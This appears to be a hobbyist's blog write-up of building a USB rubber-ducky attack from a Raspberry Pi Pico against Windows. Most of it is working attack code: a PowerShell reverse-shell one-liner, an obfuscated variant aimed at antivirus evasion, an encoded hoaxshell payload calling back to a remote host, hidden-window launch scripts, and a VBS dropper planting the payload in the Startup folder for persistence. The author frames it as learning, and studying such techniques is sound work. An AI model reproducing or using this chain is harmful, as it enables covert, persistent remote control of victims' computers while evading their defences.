# The start
I went to a CSEC meetup and got given a Pi Pico and was taught how to turn it into a rubber ducky and write a script using the .dd file.
As a POC to see if it works.
```
GUI + r
STRING notepad
ENTER
DELAY 100
STRING did this work?
```
This proceeded to open a notepad file and type "did this work?", which is exactly what it was meant to do.
## .\/.An aside into how Rubber Duckies work
The TL;DR is that they convice your computer that they are a keyboard and then proceed to send key strokes from the .dd file.

The longer version
Thats all I know about them. 

Back to the more intresting thingR

## Now what?
It would be cool to make it reach out to a server and spawn a reverse shell. This would be easy if the host is linux but for me at the time all my vm's were :( which means I had to figure out how to write it for windows.
Googling revshell windows oneliners sent me to:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
I picked this payload:
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
Changed the IP and port, opened up powershell and blindly ran it and ...
```powershell
At line:1 char:1                                                                                                        + powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient ...                                             

This script contains malicious content and has been blocked by your antivirus software.                                     + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException                                       + FullyQualifiedErrorId : ScriptContainedMaliciousContent                                                                                                       
```

# AV Bypassing ?
I remember a video I saw about bypassing AV so i copied what they did and got this.
```powershell
$aabbcc = New-Object System.Net.Sockets.TCPClient("127.0.0.1",4444);
$aabbc = $aabbcc.GetStream();[byte[]]$bbits = 0..65535|%{0};
while(($i = $aabbc.Read($bbits, 0, $bbits.Length)) -ne 0){;
$content = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bbits,0, $i);
$comebackpls = (i``e``x $content 2>&1 | Out-String );
$comebackpls2 = $comebackpls +"> ";
$sbbits = ([text.encoding]::ASCII).GetBytes($comebackpls2);
$aabbc.("Wri"+"te").Invoke($sbbits,0,$sbbits.Length);
$aabbc.Flush()};
$aabbcc.Close();
```
and the result was:
```powershell
At line:1 char:1                                                                                                        + powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient ...                                             

This script contains malicious content and has been blocked by your antivirus software.                                     + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException                                       + FullyQualifiedErrorId : ScriptContainedMaliciousContent                                                                                                       
```
Again.
I looked further into something called [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) and watched most of his talk about the script [youtube link](https://www.youtube.com/watch?v=uE8IAxM_BhE&ab_channel=Hacktivity-ITSecurityFestival). I tried a bit of the .NET syntax and broke something with the script. I then decided to put this on hold for a while.

# A new thing
I found [hoaxshell](https://github.com/t3l3machus/hoaxshell) which claims to be a shell that isn't detected by AV for some reason? So I tried running it and..
```powershell
powershell -e JABzAD0AJwAxADkAMgAuADEANgA4AC4AMQAuADEAOAA6ADgAMAA4ADAAJwA7ACQAaQA9ACcAMQA0ADkAOQAxAGQAMQA4AC0AYwAyAGEAMwAyAGEAMgBhAC0ANQBlAGYAZQA1ADkAYwAxACcAOwAkAHAAPQAnAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvADEANAA5ADkAMQBkADEAOAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQAyADIANgAxAC0ANQA4ADQAMgAiAD0AJABpAH0AOwB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApAHsAJABjAD0AKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwBjADIAYQAzADIAYQAyAGEAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AMgAyADYAMQAtADUAOAA0ADIAIgA9ACQAaQB9ACkALgBDAG8AbgB0AGUAbgB0ADsAaQBmACAAKAAkAGMAIAAtAG4AZQAgACcATgBvAG4AZQAnACkAIAB7ACQAcgA9AGkAZQB4ACAAJABjACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAHQAbwBwACAALQBFAHIAcgBvAHIAVgBhAHIAaQBhAGIAbABlACAAZQA7ACQAcgA9AE8AdQB0AC0AUwB0AHIAaQBuAGcAIAAtAEkAbgBwAHUAdABPAGIAagBlAGMAdAAgACQAcgA7ACQAdAA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHAAJABzAC8ANQBlAGYAZQA1ADkAYwAxACAALQBNAGUAdABoAG8AZAAgAFAATwBTAFQAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AMgAyADYAMQAtADUAOAA0ADIAIgA9ACQAaQB9ACAALQBCAG8AZAB5ACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAQgB5AHQAZQBzACgAJABlACsAJAByACkAIAAtAGoAbwBpAG4AIAAnACAAJwApAH0AIABzAGwAZQBlAHAAIAAwAC4AOAB9AA==
```
It works!
Lets Go.
## .\/.Decoded payload
```shell
$s='192.168.1.18:8080'
$i='14991d18-c2a32a2a-5efe59c1'
$p='http://'
$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/14991d18 -Headers @{"X-2261-5842"=$i}
while ($true){
	$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/c2a32a2a -Headers @{"X-2261-5842"=$i}).Content
	if ($c -ne 'None') {
		$r=iex $c -ErrorAction Stop -ErrorVariable e
		$r=Out-String -InputObject $r
		$t=Invoke-WebRequest -Uri $p$s/5efe59c1 -Method POST -Headers @{"X-2261-5842"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')
		} 
	sleep 0.8
	}
```

# Persistence
So i currently have a way to run a some key stroke automatically and a script that will be ignored by the AV. All that is left is persistence.

Um how do I do this?
Turns out windows has these things called services that run things when they are triggered. So lets try to make one and put the shell there. [link](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-service?view=powershell-7.2) There is an example of exactly what I want to do:
```powershell
New-Service -Name "TestService" -BinaryPathName '"C:\WINDOWS\System32\svchost.exe -k netsvcs"'
```
Change a few things.
``` powershell
New-Service -Name "TestService" -BinaryPathName '"C:\WINDOWS\System32\?"'
```
Where is powershell installed?
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

```powershell
New-Service -Name "TestService" -BinaryPathName '"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"'
```
And
```powershell
New-Service: Service ' (TestService)' cannot be created due to the following error: Access is denied.
```
;(
Well I can't use this for the payload but I wanna figure out how these work.
``` powershell
Status   Name               DisplayName                                                                                 ------   ----               -----------                                                                                 Stopped  TestService        TestService  
```
Why is it stopped? How do i start it? How do i remove it?
Oh no how do i get rid of it.
Turns out you need to install powershell 7 and it is a command :)

Back to Microsofts man page [link](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-service?view=powershell-7.2) 
So to run it you can just do this:
```powershell
Start-Service TestService
```

```
Start-Service: Service 'TestService (TestService)' cannot be started due to the following error: Cannot start service 'TestService' on computer '.'. 
```
??
Well that's dumb. I spent an hour trying to debug this and just decided to back track to trying to find a different method.

After a while I stumbled across this [page](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md) talking about all the different persistence methods for windows.
Turns out there is a folder in windows that will run whatever is put there. 
```powershell
C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
```
# Putting it all together
## Hiding the window
So how do I write a script that will run a window in the background.
To my surprise & doesn't work on windows :(

Looking on the same page there is a section on Scheduled tasks which uses `-WindowStyle hidden` adding this to the payload runs a shell that is hidden to the user.
```powershell
powershell -WindowStyle hidden -e JABzAD0AJwAxADkAMgAuADEANgA4AC4AMQAuADEAOAA6ADgAMAA4ADAAJwA7ACQAaQA9ACcAMQA0ADkAOQAxAGQAMQA4AC0AYwAyAGEAMwAyAGEAMgBhAC0ANQBlAGYAZQA1ADkAYwAxACcAOwAkAHAAPQAnAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvADEANAA5ADkAMQBkADEAOAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQAyADIANgAxAC0ANQA4ADQAMgAiAD0AJABpAH0AOwB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApAHsAJABjAD0AKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwBjADIAYQAzADIAYQAyAGEAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AMgAyADYAMQAtADUAOAA0ADIAIgA9ACQAaQB9ACkALgBDAG8AbgB0AGUAbgB0ADsAaQBmACAAKAAkAGMAIAAtAG4AZQAgACcATgBvAG4AZQAnACkAIAB7ACQAcgA9AGkAZQB4ACAAJABjACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAHQAbwBwACAALQBFAHIAcgBvAHIAVgBhAHIAaQBhAGIAbABlACAAZQA7ACQAcgA9AE8AdQB0AC0AUwB0AHIAaQBuAGcAIAAtAEkAbgBwAHUAdABPAGIAagBlAGMAdAAgACQAcgA7ACQAdAA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHAAJABzAC8ANQBlAGYAZQA1ADkAYwAxACAALQBNAGUAdABoAG8AZAAgAFAATwBTAFQAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AMgAyADYAMQAtADUAOAA0ADIAIgA9ACQAaQB9ACAALQBCAG8AZAB5ACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAQgB5AHQAZQBzACgAJABlACsAJAByACkAIAAtAGoAbwBpAG4AIAAnACAAJwApAH0AIABzAGwAZQBlAHAAIAAwAC4AOAB9AA==
```

## Testing it on the rubber ducky
So using the same idea as the original ducky script.
```txt
GUI + r
STRING cmd
ENTER
DELAY 100
STRING powershell -WindowStyle hidden -e JABzAD0AJwAxADkAMgAuADEANgA4AC4AMQAuADEAOAA6ADgAMAA4ADAAJwA7ACQAaQA9ACcAMQA0ADkAOQAxAGQAMQA4AC0AYwAyAGEAMwAyAGEAMgBhAC0ANQBlAGYAZQA1ADkAYwAxACcAOwAkAHAAPQAnAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvADEANAA5ADkAMQBkADEAOAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQAyADIANgAxAC0ANQA4ADQAMgAiAD0AJABpAH0AOwB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApAHsAJABjAD0AKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwBjADIAYQAzADIAYQAyAGEAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AMgAyADYAMQAtADUAOAA0ADIAIgA9ACQAaQB9ACkALgBDAG8AbgB0AGUAbgB0ADsAaQBmACAAKAAkAGMAIAAtAG4AZQAgACcATgBvAG4AZQAnACkAIAB7ACQAcgA9AGkAZQB4ACAAJABjACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAHQAbwBwACAALQBFAHIAcgBvAHIAVgBhAHIAaQBhAGIAbABlACAAZQA7ACQAcgA9AE8AdQB0AC0AUwB0AHIAaQBuAGcAIAAtAEkAbgBwAHUAdABPAGIAagBlAGMAdAAgACQAcgA7ACQAdAA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHAAJABzAC8ANQBlAGYAZQA1ADkAYwAxACAALQBNAGUAdABoAG8AZAAgAFAATwBTAFQAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AMgAyADYAMQAtADUAOAA0ADIAIgA9ACQAaQB9ACAALQBCAG8AZAB5ACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAQgB5AHQAZQBzACgAJABlACsAJAByACkAIAAtAGoAbwBpAG4AIAAnACAAJwApAH0AIABzAGwAZQBlAHAAIAAwAC4AOAB9AA==
ENTER
```
This takes WAY to long to type out and will also show on the command line.

## Batch script
So instead of getting the rubber ducky to write the command it could write the name of the file. Which can be done via a .bat file.
This was weirdly straight forward.
``` batch
@echo off
powershell -WindowStyle Hidden -e <payload>
```

Then the ducky script can be
```txt
GUI r
DELAY 100
STRING cmd
ENTER
DELAY 250
STRING cd /d D:\
ENTER
STRING .\script.bat
ENTER
```
which is way quicker to execute.

## Adding the persistance
This can be done two ways. Via the initial batch script or via the reverse shell connection. I don't know which one is better so I'll make both.
### The Batch Script
This could have issues with defenders exploit guard as the file wont be signed. I don't really want to figure out how to get it signed and approved so instead I'll run it via the shell.
### Reverse shell
To write the file you can use this format
```powershell
echo "contents" | out-file -encoding ascii filename.bat
```
And write this to within the startup directory.
```powershell
"C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```

This works!

Could I write this to a file before hand and then execute it from the rubber ducky script?

This should be the same as the first batch script but instead writes file to start directory.

For some reason it doesn't seem like you can pass Out-File into a script form a batch script :( 

I wrote a quick vbs script that writes the file.
```vb
Set objFSO=CreateObject("Scripting.FileSystemObject")

  

' How to write file

outFile="C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ohno.bat"

payload = "JABzAD0AJwAxADkAMgAuADEANgA4AC4AMQAuADEAOAA6ADgAMAA4ADAAJwA7ACQAaQA9ACcAZABhADgAMQBmAGYAOQAzAC0AZABjAGMAOQA2ADYANABjAC0AZAA4AGMANwA3ADcANwBkACcAOwAkAHAAPQAnAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvAGQAYQA4ADEAZgBmADkAMwAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQBiADMAYgBkAC0ANgBjADkAYgAiAD0AJABpAH0AOwB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApAHsAJABjAD0AKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwBkAGMAYwA5ADYANgA0AGMAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AYgAzAGIAZAAtADYAYwA5AGIAIgA9ACQAaQB9ACkALgBDAG8AbgB0AGUAbgB0ADsAaQBmACAAKAAkAGMAIAAtAG4AZQAgACcATgBvAG4AZQAnACkAIAB7ACQAcgA9AGkAZQB4ACAAJABjACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAHQAbwBwACAALQBFAHIAcgBvAHIAVgBhAHIAaQBhAGIAbABlACAAZQA7ACQAcgA9AE8AdQB0AC0AUwB0AHIAaQBuAGcAIAAtAEkAbgBwAHUAdABPAGIAagBlAGMAdAAgACQAcgA7ACQAdAA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHAAJABzAC8AZAA4AGMANwA3ADcANwBkACAALQBNAGUAdABoAG8AZAAgAFAATwBTAFQAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AYgAzAGIAZAAtADYAYwA5AGIAIgA9ACQAaQB9ACAALQBCAG8AZAB5ACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAQgB5AHQAZQBzACgAJABlACsAJAByACkAIAAtAGoAbwBpAG4AIAAnACAAJwApAH0AIABzAGwAZQBlAHAAIAAwAC4AOAB9AA=="

Set objFile = objFSO.CreateTextFile(outFile,True)

objFile.Write "@echo off" & vbCrLf

objFile.Write "powershell -WindowStyle Hidden"+payload & vbCrLf

  

objFile.Close
```
This however gets detected by an anti virus when run. :(

# The end
So with everything put together the rubber ducky will run a hidden powershell window which reaches back to a reverse shell. From here the attacker can implant persistence within the appdata startup directory which will give a shell whenever the user logs in to the computer.
## Things to Improve
Figure out a better (if there is one) way of installing persistence.
Obfuscate the vbs script to bypass heuristic analysis.
Fix the Start-Service error I couldn't debug.
Learn more about rubber duckies

Look into managing more than one victim machine.
Configure the hoaxshell to not need a new payload ever time it runs.

Make it work
